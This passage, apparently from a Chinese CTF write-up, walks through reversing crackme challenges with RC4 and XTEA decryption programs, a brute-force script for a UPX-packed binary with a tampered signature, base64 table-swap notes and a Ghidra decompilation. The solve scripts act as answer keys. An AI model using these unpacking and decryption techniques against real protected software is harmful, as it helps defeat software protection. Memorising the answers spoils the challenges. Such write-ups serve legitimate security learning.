class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">/*初始化函数*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">rc4_init</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*s,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*key, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Len)</span> </span>&#123;<br><span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> k[<span class="hljs-number">256</span>]= &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> tmp=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++) &#123;<br>s[i]=i;<br>k[i]=key[i%Len];<br>&#125;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++) &#123;<br>j=(j+s[i]+k[i])%<span class="hljs-number">256</span>;<br>tmp=s[i];<br>s[i]=s[j];<span class="hljs-comment">//交换s[i]和s[j]</span><br>s[j]=tmp;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*加解密*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">rc4_crypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*s,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*Data,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Len)</span> </span>&#123;<br><span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>,t=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> k=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> tmp;<br><span class="hljs-keyword">for</span>(k=<span class="hljs-number">0</span>; k&lt;Len; k++) &#123;<br>i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span>;<br>j=(j+s[i])%<span class="hljs-number">256</span>;<br>tmp=s[i];<br>s[i]=s[j];<span class="hljs-comment">//交换s[x]和s[y]</span><br>s[j]=tmp;<br>t=(s[i]+s[j])%<span class="hljs-number">256</span>;<br>Data[k]^=s[t];<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> s[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;, s2[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-comment">//S-box</span><br><span class="hljs-keyword">char</span> key[] = &#123;<span class="hljs-string">&quot;w0wy0ugot1t&quot;</span>&#125;;<span class="hljs-comment">//密钥</span><br><span class="hljs-comment">//加密后的数据 </span><br><span class="hljs-keyword">char</span> pData[]=&#123;<span class="hljs-number">0xB6</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0xfa</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0xb2</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">0xea</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0xd2</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0xe7</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0xbe</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xf3</span>,<span class="hljs-number">0xf6</span>&#125;;<br><span class="hljs-comment">//加密后数据长度</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len = <span class="hljs-built_in">strlen</span>(pData);<br><span class="hljs-comment">//unsigned long len = 32;</span><br><span class="hljs-keyword">int</span> i;<br><br><br><span class="hljs-built_in">rc4_init</span>(s, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)key, <span class="hljs-number">11</span>); <span class="hljs-comment">//初始化</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++) &#123;         <span class="hljs-comment">//用s2[i]暂时保留经过初始化的s[i]</span><br>s2[i] = s[i];<br>&#125;<br><br><span class="hljs-built_in">rc4_crypt</span>(s2, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)pData, len);<span class="hljs-comment">//解密</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;len; i++) &#123;<br>cout&lt;&lt;pData[i];<br>&#125;<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="creakme-2">creakme 2</h3><p>将程序拖入<code>ida</code>,通过简易的分析程序，大致可以看出是一个<code>xtea</code>加密</p><p><img src="https://static01.imgkr.com/temp/d5bd67a2e1c545589824c95efc8d3137.png" alt=""></p><p>关键函数就是<code>xtea_crypt</code>，key则是<code>v11</code>的<code>0-3</code></p><p><img src="https://static01.imgkr.com/temp/8f4ebc6331004b2694390ae2b26a184c.png" alt=""></p><p>进入函数也不难发现是一个标准的<code>xtea</code>模式下的加密，但是我们观察汇编时会发现<code>delta</code>有一个除 0 异常</p><p><img src="https://static01.imgkr.com/temp/1a12730db7944460802a602be960f948.png" alt=""></p><p>那么我们在编写脚本时需要添加上对应的异常处理机制</p><p>脚本如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">encipher</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> num_rounds, <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> key[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, delta=<span class="hljs-number">0x9E3779B1</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br>        v0 += (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        <span class="hljs-keyword">if</span> (sum &gt;&gt; <span class="hljs-number">31</span> == <span class="hljs-number">0</span>)&#123;<br>        sum ^= <span class="hljs-number">0x1234567</span>;<br>&#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, sum);<br>        v1 += (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, sum);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decipher</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> num_rounds, <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> key[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], delta=<span class="hljs-number">0x9E3779B1</span>, sum=<span class="hljs-number">0xc78e4d05</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        <span class="hljs-keyword">if</span> (sum &gt;&gt; <span class="hljs-number">31</span> == <span class="hljs-number">0</span>)<br>            sum ^= <span class="hljs-number">0x1234567</span>;<br>        sum -= delta;<br>        <span class="hljs-comment">//cout&lt;&lt;sum&lt;&lt;endl;</span><br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//加密数据 </span><br>    <span class="hljs-keyword">uint32_t</span> v[]=&#123;<span class="hljs-number">0x457E62CF</span>, <span class="hljs-number">0x9537896C</span>, <span class="hljs-number">0x1F7E7F72</span>, <span class="hljs-number">0xF7A073D8</span>, <span class="hljs-number">0x8E996868</span>, <span class="hljs-number">0x40AFAF99</span>, <span class="hljs-number">0xF990E34</span>, <span class="hljs-number">0x196F4086</span>&#125;;<br>    <span class="hljs-comment">//密钥 </span><br>    <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> key[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-comment">//轮数 </span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> rounds=<span class="hljs-number">32</span>;<br>    <span class="hljs-built_in">decipher</span>(rounds, v, key);<br>    <span class="hljs-built_in">decipher</span>(rounds, v + <span class="hljs-number">2</span>, key);<br>    <span class="hljs-built_in">decipher</span>(rounds, v + <span class="hljs-number">4</span>, key);<br>    <span class="hljs-built_in">decipher</span>(rounds, v + <span class="hljs-number">6</span>, key);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="upx-magic1">upx magic1</h3><p><img src="https://static01.imgkr.com/temp/4cb54c61a55943958f6ec6d659bf891b.png" alt=""></p><p><img src="https://static01.imgkr.com/temp/a1c564e8ea1e4132a00dc4daca324b8e.png" alt=""></p><p>看到题目表述有<code>upx</code>壳我们去试试看，发现提示不含<code>upx</code>壳，但是我们拖入进<code>010</code>可以卡到对应的<code>upx!</code>的压缩标识被修改成<code>upx?</code>了，我们将其还原<code>(文件末尾还有两个修改点)</code>，便可以直接脱壳。</p><p><img src="https://static01.imgkr.com/temp/d61fa823e9e143539eec0f4296140708.png" alt=""></p><p>同样的我们采用爆破的方式来解这个题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">v14 = [<span class="hljs-number">0x8d68</span>, <span class="hljs-number">0x9d49</span>, <span class="hljs-number">0x2a12</span>, <span class="hljs-number">0xab1a</span>, <span class="hljs-number">0xcbdc</span>, <span class="hljs-number">0xb92b</span>, <span class="hljs-number">0x2e32</span>, <span class="hljs-number">0x9f59</span>,<br>       <span class="hljs-number">0xddcd</span>, <span class="hljs-number">0x9d49</span>, <span class="hljs-number">0xa90a</span>, <span class="hljs-number">0xe70</span>, <span class="hljs-number">0xf5cf</span>, <span class="hljs-number">0xa50</span>, <span class="hljs-number">0x5af5</span>, <span class="hljs-number">0xff9f</span>, <span class="hljs-number">0x9f59</span>, <span class="hljs-number">0xbd0b</span>,<br>       <span class="hljs-number">0x58e5</span>, <span class="hljs-number">0x3823</span>, <span class="hljs-number">0xbf1b</span>, <span class="hljs-number">0x78a7</span>, <span class="hljs-number">0xab1a</span>, <span class="hljs-number">0x48c4</span>, <span class="hljs-number">0xa90a</span>, <span class="hljs-number">0x2c22</span>, <span class="hljs-number">0x9f59</span>, <span class="hljs-number">0x5cc5</span>,<br>       <span class="hljs-number">0x5ed5</span>, <span class="hljs-number">0x78a7</span>, <span class="hljs-number">0x2672</span>, <span class="hljs-number">0x5695</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>, <span class="hljs-number">128</span>):<br>        v12 = <span class="hljs-number">0</span><br>        v12 = j &lt;&lt; <span class="hljs-number">8</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span> (v12 &amp; <span class="hljs-number">0x8000</span>) != <span class="hljs-number">0</span>:<br>                v12 = (v12 * <span class="hljs-number">2</span>) ^ <span class="hljs-number">0x1021</span><br>            <span class="hljs-keyword">else</span>:<br>                v12 *= <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> (v12 &amp; <span class="hljs-number">0xffff</span>) == v14[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="Answer’s-Windows">Answer’s Windows</h3><p>通过字符串定位我们可以找到如下信息</p><p><img src="https://static01.imgkr.com/temp/3d04d7dbe0c741ea886ab1fbfd096c86.png" alt=""></p><blockquote><p><code>base64_crypt</code>是修改过名称的函数</p></blockquote><p>我们从加密完后的数据看得出来这个不是普通的码表，我们在字符串里面可以找到</p><p><img src="https://static01.imgkr.com/temp/4d0f8cb63e4f425dbbd7ea98a34635b5.png" alt=""></p><p>两个类似码表的数据，<code>base64</code>的码表长度为64位，我们截取前 64 位进行换表解密，即可得到对应<code>flag</code>，不过需要注意的是在使用线上网站进行解密时需要去除部分<code>\</code>，因为其表示转义，避免网站将其也识别为一个加密后的数据。</p><h3 id="creakme3">creakme3</h3><p>题目描述中出现了<code>IDA is not a panacea.</code>提示我们换一个工具，我们采用<code>ghidra</code>这个工具来进行逆向分析。</p><p>我们稍微修复一下符号表可以在主函数看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> fs;<br>  <span class="hljs-keyword">int</span> randnum;<br>  <span class="hljs-keyword">int</span> j;<br>  <span class="hljs-keyword">int</span> order_cnt;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">int</span> order [<span class="hljs-number">89</span>];<br>  <span class="hljs-keyword">int</span> canary;<br>  <br>  canary = *(<span class="hljs-keyword">int</span> *)(fs + <span class="hljs-number">-0x7008</span>);<br>  <span class="hljs-built_in">memset</span>(order,<span class="hljs-number">0</span>,<span class="hljs-number">0x164</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome my whitegive re task! This is your flag: &quot;</span>);<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x59</span>; j = j + <span class="hljs-number">1</span>) &#123;<br>      randnum = rand();<br>      order[j] = randnum % <span class="hljs-number">0x59</span>;<br>    &#125;<br>    order_cnt = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> ((order_cnt &lt; <span class="hljs-number">0x59</span> &amp;&amp; (a[order[order_cnt + <span class="hljs-number">-1</span>] * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] &lt;= a[order[order_cnt] * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>])))<br>    &#123;<br>      order_cnt = order_cnt + <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span> (order_cnt != <span class="hljs-number">0x59</span>);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x59</span>; i = i + <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">putchar</span>(a[order[i] * <span class="hljs-number">2</span>]);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (canary == *(<span class="hljs-keyword">int</span> *)(fs + <span class="hljs-number">-0x7008</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>  __stack_chk_fail();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看出来主函数就是把 a 中的数据进行排序，排完 0x59个数据后然后进行输出，我们看到 a 中的数据可以发现</p><p><img src="https://static01.imgkr.com/temp/0aa26ea364964be5bb26b8a683a95a8d.png" alt=""></p><p>这样排布的一串数据，我们根据其特点发现是每 8 位一组，同时主函数中的指针指向分别对应着 8 位中的后两位，而所有数据都要按照<code>&lt;=</code>的顺序来进行排列后才会实现输出，我们推断前面的 4 字节就是对应字符，我们把后两个 16 进制进行组合就可以得到一串数字，大概就是对应的序号，我们提取对应数据，进行排序后输出，即可得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<br>    (<span class="hljs-number">0x30</span>, <span class="hljs-number">0x4E7D</span>),<br>    (<span class="hljs-number">0x30</span>, <span class="hljs-number">0x67BD</span>),<br>    (<span class="hljs-number">0x30</span>, <span class="hljs-number">0x7A48</span>),<br>    (<span class="hljs-number">0x30</span>, <span class="hljs-number">0x82A2</span>),<br>    (<span class="hljs-number">0x30</span>, <span class="hljs-number">0x933E</span>),<br>    (<span class="hljs-number">0x31</span>, <span class="hljs-number">0x9C18</span>),<br>    (<span class="hljs-number">0x32</span>, <span class="hljs-number">0x5AFF</span>),<br>    (<span class="hljs-number">0x32</span>, <span class="hljs-number">0x6CD7</span>),<br>    (<span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6CA</span>),<br>    (<span class="hljs-number">0x32</span>, <span class="hljs-number">0xBD79</span>),<br>    (<span class="hljs-number">0x32</span>, <span class="hljs-number">0xCEBD</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0x324A</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0x3292</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0x3905</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0x4291</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0x5ADE</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0x6E9F</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0xA52A</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0xBE35</span>),<br>    (<span class="hljs-number">0x33</span>, <span class="hljs-number">0xCB63</span>),<br>    (<span class="hljs-number">0x35</span>, <span class="hljs-number">0x7F3B</span>),<br>    (<span class="hljs-number">0x38</span>, <span class="hljs-number">0x3914</span>),<br>    (<span class="hljs-number">0x38</span>, <span class="hljs-number">0xB2AD</span>),<br>    (<span class="hljs-number">0x39</span>, <span class="hljs-number">0x38DA</span>),<br>    (<span class="hljs-number">0x39</span>, <span class="hljs-number">0x4E50</span>),<br>    (<span class="hljs-number">0x39</span>, <span class="hljs-number">0x6A02</span>),<br>    (<span class="hljs-number">0x39</span>, <span class="hljs-number">0xB10F</span>),<br>    (<span class="hljs-number">0x42</span>, <span class="hljs-number">0x78E5</span>),<br>    (<span class="hljs-number">0x5F</span>, <span class="hljs-number">0x7EF6</span>),<br>    (<span class="hljs-number">0x5F</span>, <span class="hljs-number">0x89A3</span>),<br>    (<span class="hljs-number">0x5F</span>, <span class="hljs-number">0x8EBD</span>),<br>    (<span class="hljs-number">0x5F</span>, <span class="hljs-number">0x95E3</span>),<br>    (<span class="hljs-number">0x61</span>, <span class="hljs-number">0x73DA</span>),<br>    (<span class="hljs-number">0x64</span>, <span class="hljs-number">0x538C</span>),<br>    (<span class="hljs-number">0x64</span>, <span class="hljs-number">0x633B</span>),<br>    (<span class="hljs-number">0x64</span>, <span class="hljs-number">0x9E9C</span>),<br>    (<span class="hljs-number">0x64</span>, <span class="hljs-number">0xB78B</span>),<br>    (<span class="hljs-number">0x64</span>, <span class="hljs-number">0xC866</span>),<br>    (<span class="hljs-number">0x65</span>, <span class="hljs-number">0x32AE</span>),<br>    (<span class="hljs-number">0x65</span>, <span class="hljs-number">0x7679</span>),<br>    (<span class="hljs-number">0x66</span>, <span class="hljs-number">0x2AE7</span>),<br>    (<span class="hljs-number">0x66</span>, <span class="hljs-number">0x4D6A</span>),<br>    (<span class="hljs-number">0x66</span>, <span class="hljs-number">0x5708</span>),<br>    (<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6610</span>),<br>    (<span class="hljs-number">0x66</span>, <span class="hljs-number">0xA258</span>),<br>    (<span class="hljs-number">0x66</span>, <span class="hljs-number">0xB80C</span>),<br>    (<span class="hljs-number">0x66</span>, <span class="hljs-number">0xC885</span>),<br>    (<span class="hljs-number">0x67</span>, <span class="hljs-number">0x710A</span>),<br>    (<span class="hljs-number">0x67</span>, <span class="hljs-number">0x7CF4</span>),<br>    (<span class="hljs-number">0x68</span>, <span class="hljs-number">0x3F76</span>),<br>    (<span class="hljs-number">0x68</span>, <span class="hljs-number">0x702B</span>),<br>    (<span class="hljs-number">0x68</span>, <span class="hljs-number">0xA3EE</span>),<br>    (<span class="hljs-number">0x68</span>, <span class="hljs-number">0xAD50</span>),<br>    (<span class="hljs-number">0x68</span>, <span class="hljs-number">0xBAC7</span>),<br>    (<span class="hljs-number">0x69</span>, <span class="hljs-number">0x4024</span>),<br>    (<span class="hljs-number">0x69</span>, <span class="hljs-number">0x8A22</span>),<br>    (<span class="hljs-number">0x69</span>, <span class="hljs-number">0xC055</span>),<br>    (<span class="hljs-number">0x6A</span>, <span class="hljs-number">0x2B52</span>),<br>    (<span class="hljs-number">0x6A</span>, <span class="hljs-number">0xC687</span>),<br>    (<span class="hljs-number">0x6B</span>, <span class="hljs-number">0x5F00</span>),<br>    (<span 